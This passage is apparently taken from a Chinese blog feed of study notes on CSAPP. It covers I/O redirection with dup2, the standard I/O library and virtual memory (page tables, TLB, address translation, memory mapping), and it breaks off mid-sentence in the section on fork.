foo.txt</span><br></code></pre></td></tr></table></figure><p>可以把 ls 命令的输出定向到磁盘文件 foo.txt 中。</p><p>I&#x2F;O 重定向是怎么工作的呢？其中一种方法是使用 dup2 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">dup2</span><span class="hljs-params">(<span class="hljs-type">int</span> oldfd, <span class="hljs-type">int</span> newfd)</span>;<br><br><span class="hljs-comment">// 返回：若成功则为非负的描述符，若出错则为 -1。</span><br></code></pre></td></tr></table></figure><p>dup2 函数复制描述符表表项 <em>oldfd</em> 到描述符表表项 <em>newfd</em>，覆盖描述符表表项 <em>newfd</em> 以前的内容。如果 <em>newfd</em> 已经打开了，dup2 会在复制 <em>oldfd</em> 之前关闭 <em>newfd</em>。</p><p>举个例子，我们调用 <code>dup2(4,1)</code>，调用之前，状态如共享文件中的图一一样，标准描述符 1 对应与文件 A，描述符 4 对应于文件 B。此时 A 和 B 的引用计数都等于1。</p><p>在调用后，两个描述符都指向文件 B ，文件 A 被关闭，并且它的文件表和 v-node 表表项也已经被删除了。文件 B的引用计数也已经增加。从此以后，任何写到标准输出的数据都被重定向到文件 B。</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E9%87%8D%E5%AE%9A%E5%90%91%E6%B5%81%E7%A8%8B.png"></p><h1 id="标准-I-x2F-O"><a href="#标准-I-x2F-O" class="headerlink" title="标准 I&#x2F;O"></a>标准 I&#x2F;O</h1><p>C 语言定义了一组高级输人输出函数，称为标准 I&#x2F;O 库，为程序员提供了 Unix I&#x2F;O 的较高级别的替代。</p><p>glibc 提供了打开和关闭文件的函数（fopen 和 fclose）、读和写字节的函数（fread 和 fwrite）、读和写字符串的函数（fgets 和 fputs），以及复杂的格式化的 I&#x2F;O 函数（scanf 和 printf）。</p><p>标准 I&#x2F;O 库将一个打开的文件模型化为一个流。对于程序员而言，一个流就是一个指向 FILE 类型的结构的指针。每个 ANSI C 程序开始时都有三个打开的流 stdin、stdout 和 stderr，分别对应于标准输入、标准输出和标准错误</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stdin</span>;       <span class="hljs-comment">/* Standard input (descriptor 0) */</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stdout</span>;      <span class="hljs-comment">/* Standard output (descriptor 1) */</span><br><span class="hljs-keyword">extern</span> FILE *<span class="hljs-built_in">stderr</span>;      <span class="hljs-comment">/* Standard error (descriptor 2) */</span><br></code></pre></td></tr></table></figure><p>类型为 FILE 的流是对文件描述符和流缓冲区的抽象。流缓冲区的目的和 RIO 读缓冲区的一样,就是使开销较高的 Linux I&#x2F;O 系统调用的数量尽可能得小。</p><p>例如，假设我们有一个程序，它反复调用标准 I&#x2F;O 的 getc 函数，每次调用返回文件的下一个字符。当第一次调用 getc 时，库通过调用一次 read 函数来填充流缓冲区，然后将缓冲区中的第一个字节返回给应用程序。只要缓冲区中还有未读的字节，接下来对 getc 的调用就能直接从流缓冲区得到服务。</p><h1 id="我该使用哪些-I-x2F-O-函数？"><a href="#我该使用哪些-I-x2F-O-函数？" class="headerlink" title="我该使用哪些 I&#x2F;O 函数？"></a>我该使用哪些 I&#x2F;O 函数？</h1><p>下图是 Unix I&#x2F;O、标准 I&#x2F;O、和 RIO 之间的关系：</p><p><img src="/img/CSAPP-%E7%AC%AC%E5%8D%81%E7%AB%A0-%E7%B3%BB%E7%BB%9F%E7%BA%A7IO/10-%E5%90%84%E7%A7%8DIO%E7%9A%84%E5%85%B3%E7%B3%BB.png"></p><p>那么我们写程序的时候该使用哪个函数呢？</p><p>书中给出了几个原则：</p><ul><li><strong>G1：只要有可能就使用标准 I&#x2F;O。</strong>对磁盘和终端设备 I&#x2F;O 来说，标准 I&#x2F;O 函数是首选方法。除了 stat 读取文件基本信息以外，使用 stdio 封装的函数。</li><li><strong>G2：不要使用 scanf 或 rio_readlineb 来读二进制文件。</strong>像 scanf 或 rio_read-lineb 这样的函数是专门设计来读取文本文件的。二进制文件可能会散布很多的 0xa 字节，而 scanf 遇到会将它们识别为终止符，因此会出现错误。</li><li><strong>G3：对网络套接字的 I&#x2F;O 使用 RIO 函数。</strong>Linux 对网络的抽象是一种称为套接字的文件类型。就像所有的 Linux 文件一样，套接字由文件描述符来引用，在这种情况下称为套接字描述符。应用程序进程通过读写套接字描述符来与运行在其他计算机的进程实现通信。</li></ul><p>标准 I&#x2F;O 流，从某种意义上而言是全双工的，因为程序能够在同一个流上执行输入和输出。但需要注意，对流的限制和对套接字的限制，有时候会互相冲突：</p><ul><li><strong>限制 1：跟在输出函数之后的输入函数。</strong>如果中间没有插入对 fflush、fseek、fsetpos 或者 rewind 的调用，一个输入函数不能跟随在一个输出函数之后。fflush 函数清空与流相关的缓冲区。后三个函数使用 Unix I&#x2F;O lseek 函数来重置当前的文件位置。</li><li><strong>限制 2：跟在输入函数之后的输出函数。</strong>如果中间没有插入对 fseek、fsetpos 或者 rewind 的调用，一个输出函数不能跟随在一个输入函数之后，除非该输入函数遇到了一个文件结束。</li></ul><hr><p>原来还可以  <code>ls &gt; foo.txt</code> 重定向输出流！</p><p>我是土狗</p><p>——<del>手动分割线</del>—-</p><p>老师为什么我们家子涵艺考这船不放假</p><p>天杀的我要报警抓你们！！</p>]]></content>
    
    
    <categories>
      
      <category>读书笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Knowledge</tag>
      
      <tag>CSAPP</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP 第九章 虚拟内存</title>
    <link href="/2023/12/07/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/"/>
    <url>/2023/12/07/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/</url>
    
    <content type="html"><![CDATA[<p>主要是虚拟内存和地址翻译的内容</p><span id="more"></span><p>虚拟内存是硬件异常、硬件地址翻译、主存、磁盘文件和内核软件的完美交互，它为每个进程提供了一个大的、一致的和私有的地址空间。虚拟内存提供了三个重要的能力：</p><ul><li>它将主存视为硬盘的高速缓存，在主存只保留活动区域（局部性原理）</li><li>它为每个进程提供一致的地址空间</li><li>它保护了进程的内存，防止被其他进程破坏</li></ul><h1 id="物理和虚拟寻址"><a href="#物理和虚拟寻址" class="headerlink" title="物理和虚拟寻址"></a>物理和虚拟寻址</h1><p>计算机系统的主存被组织成一个由 M 个连续的字节大小的单元组成的数组。每字节都有一个唯一的物理地址（Physical Address，PA）。第一个字节的地址为 0，接下来的字节地址为1，再下一个为 2，依此类推。</p><p>CPU 访问内存的最自然的方式就是使用物理地址。我们把这种方式称为<strong>物理寻址</strong>（physical addressing）。如下图是一个示例：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-CPU%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E8%AE%BF%E5%AD%98.png"></p><p>早期的 CPU 使用物理寻址，直到现在诸如数字信号处理器、嵌入式微控制器以及 Cray 超级计算机这样的系统仍然继续使用这种寻址方式。</p><p>现代处理器使用的是一种称为<strong>虚拟寻址</strong>（virtual addressing）的寻址形式。如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E8%99%9A%E6%8B%9F%E5%9C%B0%E5%9D%80%E8%AE%BF%E5%AD%98.png"></p><p>使用虚拟寻址，CPU通过生成一个虚拟地址（Virtual Address，VA）来访问主存，这个虚拟地址在被送到内存之前先转换成适当的物理地址。将一个虚拟地址转换为物理地址的任务叫做<strong>地址翻译</strong>（address translation）。就像异常处理一样，地址翻需要 CPU 硬件和操作系统之间的紧密合作。CPU 芯片上叫做<strong>内管理单元（Memory Management Unit，MMU）</strong>的专用硬件，利用存放在主存中的查询表来动态翻译虚拟地址，该表的内容由操作系统管理。</p><h1 id="地址空间"><a href="#地址空间" class="headerlink" title="地址空间"></a>地址空间</h1><p>地址空间是一个非负整数地址的有序集合，为了简化讨论，我们假设地址空间是线性地址空间。</p><blockquote><p>如果地址空间中的整数是连续的，那么我们说它是<strong>线性地址空间</strong>。</p></blockquote><p>在带虚拟存储器的系统中，CPU从一个有 $$2^n$$ 个地址的地址空间中生成虚拟地址，这个地址空间称为<strong>虚拟地址空间</strong>：{0，1，2，···，N-1}。</p><p>一个地址空间的大小是由表示最大地址所需要的位数来描述的。例如，一个包含 $$N&#x3D;2^n$$ 个地址的虚拟地址空间叫做一个 n 位地址空间。现代系统通常支持32位或者64位虚拟地址空间。</p><p>一个系统还有<strong>物理地址空间</strong>，对应系统中物理存储器的 M 个字节相：{0，1，2，···，N-1}。实际上，M 并不要求是 2 的幂。但为了简化讨论，我们一般假设 $$M&#x3D;2^m$$ 。</p><p>地址空间的概念非常重要。它清楚地区分了数据对象（字节）和它们的属性（地址）。允许每个数据对象有多个独立的地址，其中每一个地址都选自一个不同的地址空间，这就是虚拟存储器的基本思想。<strong>主存中的每个字节都有一个选自虚拟地址空间的虚拟地址和一个选自物理地址空间的物理地址。</strong></p><h1 id="虚拟内存作为缓存的工具"><a href="#虚拟内存作为缓存的工具" class="headerlink" title="虚拟内存作为缓存的工具"></a>虚拟内存作为缓存的工具</h1><p>VM 系统通过将虚拟内存分割为称为虚拟页（Virtual Page，VP）的大小固定的块来分割磁盘上的数据。每个虚拟页的大小为 $$P&#x3D;2^P$$ 字节。</p><p>类似地，物理内存被分割为物理页（Physical Page，PP），也被称为页帧（page frame），大小也为 P字节)。</p><p>在任意时刻，虚拟页面的集合都分为三个不相交的子集：</p><ul><li>未分配的：VM 系统还未分配或者创建的页。未分配的块没有任何数据和它们相关联，因此也就不占用任何磁盘空间。</li><li>缓存的：当前已缓存在物理内存中的已分配页。</li><li>未缓存的：未缓存在物理内存中的已分配页。</li></ul><p>下图是一个示例：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%86%85%E5%AD%98%E5%88%86%E9%A1%B5.png"></p><p>虚拟页 0 和 3 还没有被分配，因此在磁盘上还不存在。虚拟页 1、4 和 6 被缓存在物理内存中。页 2、5 和 7 已经被分配了，但是当前并未缓存在主存中。</p><h3 id="DRAM缓存的组织结构"><a href="#DRAM缓存的组织结构" class="headerlink" title="DRAM缓存的组织结构"></a>DRAM缓存的组织结构</h3><blockquote><p>我们用 SRAM 缓存来表示 L1、L2、L3 高速缓存，用 DARM 来表示虚拟内存中的缓存。</p></blockquote><p>DRAM 比 SRAM 慢 10 倍，而磁盘读取速度比 DRAM 慢了 100 000 倍，因此 DRAM 中的不命中需要很大的开销。因此 DRAM 作为磁盘的高速缓存，采用全相联高速缓存，即任何虚拟页可以放在任意的物理页中。我们的替换策略也很重要，因为替换错了的成本也非常高。最后因为访问时间的关系，往往采用写回而不是直写。</p><h3 id="页表"><a href="#页表" class="headerlink" title="页表"></a>页表</h3><p>页表用于将虚拟页映射到物理页。每次地址翻译硬件讲一个虚拟地址转换为物理地址时，都会读取页表。     </p><p>页表就是一个页表条目的数组。虚拟地址空间在每一个页表中一个固定偏移量处都有一个 PTE 。PTE 由一个有效位和 n 位地址字段组成。如果设置了有效位，那么 n 位的字段表示 DRAM 中相应的物理页的起始位置（已缓存）。如果没设置有效位，就表示这个虚拟页还未被分配。否则，这个地址指向虚拟页在磁盘上的起始位置。</p><p>例如：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E9%A1%B5%E8%A1%A8.png"></p><p>上图中有 8 个虚拟页和 4 个物理页的系统的页表。四个虚拟页（VP 1、VP 2、VP 4 和 VP 7）当前被缓存在 DRAM 中。两个页（VP 0 和 VP 5 ）还未被分配，而剩下的页（VP 3 和 VP 6）已经被分配了，但是当前还未被缓存。</p><p>注意，因为 DRAM 缓存是全相联的，所以任意物理页都可以包含任意虚拟页。</p><h3 id="页命中"><a href="#页命中" class="headerlink" title="页命中"></a>页命中</h3><p>地址翻译硬件将虚拟地址作为一个索引来定位 PTE 2，并从内存中读取它。因为它设置了有效位，所以地址翻译硬件就知道 VP 2 是缓在内存中的了。它使用 PTE 中的物理内存地址（该地址指向 PP1中缓存页的起始位置），构造出这个字的物理地址，这就是页命中。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E9%A1%B5%E5%91%BD%E4%B8%AD.png"></p><h3 id="缺页"><a href="#缺页" class="headerlink" title="缺页"></a>缺页</h3><p>DRAM 缓存不命中称为缺页。</p><p>如下图是一个缺页异常处理的示例：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B81.png"></p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%BC%BA%E9%A1%B5%E5%BC%82%E5%B8%B82.png"></p><p>当 CPU 尝试访问一个<strong>已分配但未缓存</strong>的页面（此例为 VP 3 ，CPU 引用了其中的字，但并未缓存在 DRAM 中）时会引发<strong>缺页异常</strong>。缺页异常调用内核中的缺页异常处理程序，该程序会选择一个牺牲页（此例为 VP 4），如果牺牲页被修改过，会把这个页再复制回磁盘。无论牺牲页如何，内核都会修改页表把牺牲页替换掉，把当前要用的页在页表中替换上物理地址。</p><p>在虚拟内存的习惯说法中，块被称为页。在磁盘和内存之间传送页的活动叫做<strong>交换</strong>（swapping）或者<strong>页面调度</strong>（paging）。页从磁盘换入（或者页面调入）DRAM 和从DRAM 换出（或者页面调出）磁盘。一直等待，直到最后时刻，也就是当有不命中发生时，才换入页面的这种策略称为<strong>按需页面调度</strong>（demand paging）。当然也有其他的调度方式，但是所有现代系统都使用的是按需页面调度的方式。</p><h3 id="分配页面"><a href="#分配页面" class="headerlink" title="分配页面"></a>分配页面</h3><p>分配一个页的分配过程是在<strong>磁盘</strong>上创建空间并更新页表，使它指向磁盘上这个新创建的页面。</p><h3 id="局部性"><a href="#局部性" class="headerlink" title="局部性"></a>局部性</h3><blockquote><p>原来的小节标题“又是局部性救了我们”这个翻译好中二哈哈哈哈哈</p></blockquote><p>我们前面有说虚拟内存的不命中处罚很大，页面调度是否会影响我们的程序性能呢？</p><p>答案是否定的，由于局部性原则保证了在任何时刻，程序将趋向于在一个较小的活动页面集合上工作，这个集合叫做工作集或者常驻集合。在初始开销，也就是将工作集页面调度到内存中之后，接下来对这个工作集的引用将导致命中，而不会产生额外的磁盘流量。</p><p>如果工作集的大小超出了物理内存的大小，那么程序将产生一种不幸的状态，叫做抖动(thrashing)，这时页面将不断地换进换出。如果程序突然运行的很慢，我们就要考虑是不是发生了抖动。</p><h1 id="虚拟内存作为内存管理的工具"><a href="#虚拟内存作为内存管理的工具" class="headerlink" title="虚拟内存作为内存管理的工具"></a>虚拟内存作为内存管理的工具</h1><p>实际上，操作系统为每个进程都提供了一个独立的页表，也就是一个独立的虚拟地址空间。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%8B%AC%E7%AB%8B%E9%A1%B5%E8%A1%A8.png"></p><p>VM 简化了连接和加载、代码和数据共享以及程序中的内存分配：</p><ul><li><p>简化链接：我们可以看到，在 Linux x86-64 下面链接得到的可执行文件，它的地址几乎是一样的，都是从 <code>0x400000</code> 开始的代码段，正是由于虚拟内存导致我们可以不需要考虑当时电脑的运行状态，因为不同进程的 <code>0x400000</code> 地址所映射到的物理内存地址都是不一样的。如果直接使用物理地址的话，那么不同进程必须划分地址出来，占用相同地址空间的程序将不能同时运行。</p></li><li><p>简化加载：加载运行一个文件时，我只需要将页表标记到磁盘的指定位置，并标记为无效的（未缓存的），CPU 尝试访问这个虚拟内存的时候，发现没有被缓存，自动从磁盘调入数据到内存中，虚拟内存机制帮我们简化了从磁盘复制数据到内存的过程。</p></li><li><p>简化共享：如果我们想加载一个动态链接库到另外一个内存，我们只需要先看看有没有已加载的内存，如果有直接让希望加载动态链接库的进程直接映射一块虚拟内存过去即可。</p></li><li><p>简化内存分配：由于虚拟内存机制的存在，我们想要分配一个很大的连续的虚拟地址空间可以允许我们用不同的物理内存页，更高效地利用了碎片化的内存。</p></li></ul><h1 id="虚拟内存作为内存保护的工具"><a href="#虚拟内存作为内存保护的工具" class="headerlink" title="虚拟内存作为内存保护的工具"></a>虚拟内存作为内存保护的工具</h1><p>每次 CPU 生成一个地址时，地址翻译硬件都会读一个 PTE ，并在 PTE 上添加额外的许可位来控制对虚拟页面内容的访问。</p><p>许可位有三个，分别是 SUP 位、READ 位和 WRITE 位。SUP 位表示进程是否必须运行在内核模式下才能访问该页。READ位和 WRITE 位控制对页面的读和写访问。</p><h1 id="地址翻译"><a href="#地址翻译" class="headerlink" title="地址翻译"></a>地址翻译</h1><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91%E7%AC%A6%E5%8F%B7.png"></p><p>形式上来说，地址翻译是一个 N 元素的虚拟地址空间（VAS）中的元素和一个 M 元素的物理地址空间（PAS）中元素之间的映射。</p><p>下面一张图反映了这关系：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E4%BD%BF%E7%94%A8%E9%A1%B5%E8%A1%A8%E7%9A%84%E5%9C%B0%E5%9D%80%E6%98%A0%E5%B0%84.png"></p><p>如上图，CPU 中的页表基址寄存器（PTBR）指向当前页面。n 位的虚拟地址包含两个部分：一个 P 位的虚拟页面偏移（VPO）和一个 n-p 位的虚拟页号（VPN）。MMU 也一依据 VPN 来选择 PTE 。</p><p>页面命中时，CPU 硬件执行的步骤如下：</p><ul><li>第 1 步：处理器生成一个虚拟地址，并把它传送给 MMU。</li><li>第 2 步：MMU 生成 PTE 地址，并从高速缓存&#x2F;主存请求得到它。</li><li>第 3 步：高速缓存&#x2F;主存向 MMU 返回 PTE。</li><li>第 4 步：MMU 构造物理地址，并把它传送给高速缓存&#x2F;主存。</li><li>第 5 步：高速缓存&#x2F;主存返回所请求的数据字给处理器。</li></ul><p>缺页时从第四步开始不同：</p><ul><li>第 4 步：PTE 中的有效位是零，所以 MMU 触发了一次异常，传递 CPU 中的控制到操作系统内核中的缺页异常处理程序。</li><li>第 5 步：缺页处理程序确定出物理内存中的牺牲页，如果这个页面已经被修改了，则把它换出到磁盘。</li><li>第 6 步：缺页处理程序页面调入新的页面，并更新内存中的 PTE 。</li><li>第 7 步：缺页处理程序返回到原来的进程，再次执行导致缺页的指令。CPU 将引起缺页的虚拟地址重新发送给 MMU。因为虚拟页面现在缓存在物理内存中，所以就会命中，之后就跟正常一样，主存会将所请求字返回给处理器。</li></ul><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%BC%BA%E9%A1%B5%E5%92%8C%E4%B8%8D%E7%BC%BA%E9%A1%B5.png"></p><h3 id="结合高速缓存和虚拟内存"><a href="#结合高速缓存和虚拟内存" class="headerlink" title="结合高速缓存和虚拟内存"></a>结合高速缓存和虚拟内存</h3><p>在及使用虚拟内存又使用 SRAM 高速缓存的系统中，大多数系统选择物理寻址，得知翻译发生在高速缓存查找之前。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98%E5%92%8CSRAM.png"></p><h3 id="利用-TLB-加速地址翻译"><a href="#利用-TLB-加速地址翻译" class="headerlink" title="利用 TLB 加速地址翻译"></a>利用 TLB 加速地址翻译</h3><p>TLB 是一个小的、虚拟寻址的缓存，其中每一行都保存着一个由单个 PTE 组成的块。TLB通常有高度的相联度。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-TLB.png"></p><p>在TLB 中，<code>VPN</code> 的低 t 位是索引，剩余高 <code>n-p-t</code> 位为标记。</p><p>TLB 的地址翻译都是在芯片中的 MMU 进行的，就避免了去读取内存，所以非常快.</p><h3 id="多级页表"><a href="#多级页表" class="headerlink" title="多级页表"></a>多级页表</h3><p>实际的系统中，我们采用层次结构的页表。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%A4%9A%E7%BA%A7%E9%A1%B5%E8%A1%A8.png"></p><p>以32位程序为例，二级页表中的每个 PTE 都负责映射一个 4KB 的虚拟内存页面，</p><p>这种方法从两个方面减少了内存要求：</p><ul><li><p>如果一级页表中的一个 PTE 是空的，那么相应的二级页表就根本不会存在。</p></li><li><p>只有一级页表才需要总是在主存中，只有最经常使用的二级页表才需要缓存在主存中。虚拟内存系统可以在需要时创建、页面调人或调出二级页表，这就减少了主存的压力。</p></li></ul><p>那么对于一个 32 位的内存地址，每个地址都会被划分为 k 个 VPN 和 1 个 VPO。每个 VPNi 都是一个到第级页表的索引。第 i 级页表中的每个 PTE，都指向第 j+1级的某个页表的基址。可以理解为，前 10 位就表示一级页表偏移，中间 10 位表示二级页表偏移，剩下 12 位就是页内偏移了。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E4%BD%BF%E7%94%A8K%E7%BA%A7%E9%A1%B5%E8%A1%A8%E7%9A%84%E5%9C%B0%E5%9D%80%E7%BF%BB%E8%AF%91.png"></p><h3 id="端到端的地址翻译"><a href="#端到端的地址翻译" class="headerlink" title="端到端的地址翻译"></a>端到端的地址翻译</h3><p>我们假设系统参数如下：</p><ul><li>内存是按字节寻址的。</li><li>内存访问是针对 1 字节的字的（不是 4 字节的字）。</li><li>虚拟地址是 14 位长的（n&#x3D;14）。</li><li>物理地址是 12 位长的（m&#x3D;12）。</li><li>页面大小是 64 字节（P&#x3D;64）。</li><li>TLB 是四路组相联的，总共有 16 个条目。</li><li>L1 d-cache 是物理寻址、直接映射的，行大小为 4 字节，而总共有 16 个组。</li></ul><p>我们对虚拟地址和物理地址的格式划分如下图：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86.png"></p><p>下图是小内存系统的一个快照，包括 TLB、页表的一部分和 L1 高速缓存：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AFTLB.png"></p><p>TLB 是利用 VPN 的位进行虚拟寻址的。因为 TLB 有 4 个组，所以 VPN 的低 2 位就作为组索引（TLBI）。VPN 中剩下的高 6位作为标记（TLBT），用来区别可能映射到同一个 TLB 组的不同的 VPN。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E9%A1%B5%E8%A1%A8.png"></p><p>页表是一个单级设计，一共有 $$2^8&#x3D;256 $$ 个页表条目（PTE）。我们只展示了开头的 16 个。为了方便，我们用索引它的 VPN 来标识每个 PTE。</p><p>但是要注意这些 VPN 并不是页表的一部分，也不储存在内存中。另外，图中有效位被标记为 0 的 PTE 的 PPN 都用一个破折号来表示。无论这里存储的是什么位值，都是没有任何意义的。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E9%AB%98%E9%80%9F%E7%BC%93%E5%AD%98.png"></p><p>直接映射的缓存是通过物理地址中的字段来寻址的。因为每个块都是 4 字节，所以物理地址的低 2 位作为块偏移（CO）。因为有 16 组，所以接下来的 4 位就用来表示组索引（CI），剩下的 6 位作为标记（CT）。</p><p>以上就是所有的初始化的设定。</p><p>我们看看当 CPU 执行一条读地址 0x03d4 处字节的加载指令时会发生什么。</p><p>首先我们把地址划分一下：</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86%E5%AE%9E%E4%BE%8B.png"></p><p>开始时,MMU会从虚拟地址中取出 VPN(0xF) ，并检查 TLB。在上方初始设定中的页表图中，我们能找到一个 PPN 为 0xD 的记录，那么拿到这个 PPN 之后，我们和 VPO(0x14) 拼接就算出物理地址（0x354）了。</p><p>接下来,MMU 发送物理地址到缓存，缓存从物理地址中划分出 CO、 CI、和 CT 。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%AB%AF%E5%88%B0%E7%AB%AF%E7%89%A9%E7%90%86%E5%9C%B0%E5%9D%80%E5%88%92%E5%88%86.png"></p><p>组 0x5 中的标记与 CT 相匹配，所以缓存检测到一个命中，读出在偏移量 CO处的数据字节（0x36），并将它返给 MMU，随后 MMU 将它传递回 CPU。</p><h1 id="内存映射"><a href="#内存映射" class="headerlink" title="内存映射"></a>内存映射</h1><p>Linux 通过将一个虚拟内存区域与一个磁盘上的对象关联起来，以初始化这个虚拟内存区域的内容，这个过程称为<strong>内存映射（memory mapping）</strong>。</p><p>虚拟内存区域可以映射到以下两种对象中：</p><ul><li>Linux 文件系统中的普通文件：我们尝试去打开一个文件或者是执行一个文件时，都会创建数个虚拟内存页，并把它标记到这个文件所在磁盘的位置，那么尝试读这块内存的时候由<strong>缺页处理程序</strong>负责把磁盘中的文件加载到内存中。</li><li>匿名文件：一个区域也可以映射到一个匿名文件，匿名文件是由内核创建的，包含的全是二进制零，匿名文件存在的意义是用于父子进程之间通信而不被其它进程获取。</li></ul><p>无论在哪种情况中，一旦一个虚拟页面被初始化了，它就在一个由内核维护的专门的<strong>交换文件（swap file）</strong>之间换来换去，换文件也叫做交换空间或者交换区域。</p><p>在任何时刻，交换文件都限制着当前运行的进程能够分配的虚拟页面的总数。</p><h3 id="共享对象"><a href="#共享对象" class="headerlink" title="共享对象"></a>共享对象</h3><p>一个对象可以被映射到虚拟内存的一个区域，要么作为共享对象，要么作为私有对象。如果一个进程将一个共享对象映射到他的虚拟地址的一个区域，那么它对这个区域的操作对其他进程可见，同时可以反映到磁盘上，但是如果映射到了私有区域，那么其他进程不可见，而且不会在磁盘上发生变化。</p><p>如下图，我们假设进程1将共享对象映射到虚拟内存（a），而后进程2将同一个通向对象映射到它的地址区域。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E5%85%B1%E4%BA%AB%E5%AF%B9%E8%B1%A1.png"></p><p>因为每一个对象都有唯一的文件名，内核就可以迅速锁定虚拟进程已经映射，所以物理地址只需要存放共享对象的一个副本。</p><p>私有对象使用写时复制的技术映射到虚拟内存中。</p><p><img src="/img/CSAPP-%E7%AC%AC%E4%B9%9D%E7%AB%A0-%E8%99%9A%E6%8B%9F%E5%86%85%E5%AD%98/9-%E7%A7%81%E6%9C%89%E5%AF%B9%E8%B1%A1%E6%98%A0%E5%B0%84.png"></p><p>第一次写内存区域时，重新分配新的物理内存，并把此段内存拷贝到上面去，然后重新改变那个进程的页表，把对应的虚拟内存区域映射改到我们新复制的物理内存区域。</p><h3 id="fork函数"><a href="#fork函数" class="headerlink" title="fork函数"></a>fork函数</h3><p>当 fork 函数被当前进程调用时，内核为新进程创建各种数据结构，并分配给它一个唯一的 PID。为了给这个新进程创建虚拟内存，它创建了当前进程的 mm_struct、区域结构和页表的原样副本。它将两个进程中的每个页面都标记为只读，并将两个进程中的每个区域结构都标记为私有的写时复制。</p><p>当 fork 在新进程中返回时，新进程现在的虚拟内存刚好和调用 fork 